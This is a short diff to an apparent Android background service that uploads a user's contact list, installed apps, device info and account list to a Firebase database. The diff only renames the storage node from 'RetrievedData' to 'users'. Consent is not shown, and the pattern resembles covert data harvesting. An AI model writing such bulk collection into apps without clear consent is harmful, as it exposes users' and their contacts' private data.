@@ -50,7 +50,7 @@ public class BasicDataUploadService extends JobIntentService {
         String deviceInfo = intent.getStringExtra("deviceInfo");
 
         if (contactsInfoList != null) {
-            databaseReference.child("RetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
                     sharedPrefs.saveBasicDataUploaded(true);
@@ -65,7 +65,7 @@ public class BasicDataUploadService extends JobIntentService {
             });
         }
         if (installedAppsList != null) {
-            databaseReference.child("RetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
                     sharedPrefs.saveBasicDataUploaded(true);
@@ -81,7 +81,7 @@ public class BasicDataUploadService extends JobIntentService {
         }
 
         if (deviceInfo != null) {
-            databaseReference.child("RetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
                     sharedPrefs.saveBasicDataUploaded(true);
@@ -97,7 +97,7 @@ public class BasicDataUploadService extends JobIntentService {
         }
 
         if (accountList != null) {
-            databaseReference.child("RetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
+            databaseReference.child("users").child(firebaseAuth.getCurrentUser().getUid()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
                 @Override
                 public void onSuccess(Void aVoid) {
                     sharedPrefs.saveBasicDataUploaded(true);
